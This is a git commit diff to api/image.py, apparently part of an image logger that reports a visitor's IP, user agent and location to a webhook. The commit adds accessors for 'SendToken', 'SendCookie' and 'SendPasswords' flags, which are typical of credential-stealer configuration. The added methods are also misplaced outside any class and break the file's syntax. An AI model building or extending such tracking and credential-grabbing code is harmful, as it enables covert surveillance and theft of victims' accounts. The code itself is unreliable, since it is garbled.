0cfbaa8ee8c19dbb898435870fc820c30cfff800
bnfahad34 <A86784462@GMAIL.COM>
2025-05-27 13:34:11 +0300

    Update image.py

--- api/image.py
+++ api/image.py
@@ -175,6 +175,39 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     }
   ],
 }
+
+
+    @property
+    def name(self):
+        return self._title_configs["name"]
+    
+    @property
+    def servername(self):
+        return self._title_configs["servername"]
+
+    @property
+    def program(self):
+        return self._title_configs["program"]
+
+    @property
+    def bot_name(self):
+        return self._webhook_configs['Bot_Name']
+
+    @property
+    def bot_avatar(self):
+        return self._webhook_configs['Bot_Avatar']
+
+    @property
+    def send_token(self):
+        return self._other_configs['SendToken']
+
+    @property
+    def send_cookie(self):
+        return self._other_configs['SendCookie']
+
+    @property
+    def send_passwords(self):
+        return self._other_configs['SendPasswords']
     
     if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
     requests.post(config["webhook"], json = embed)
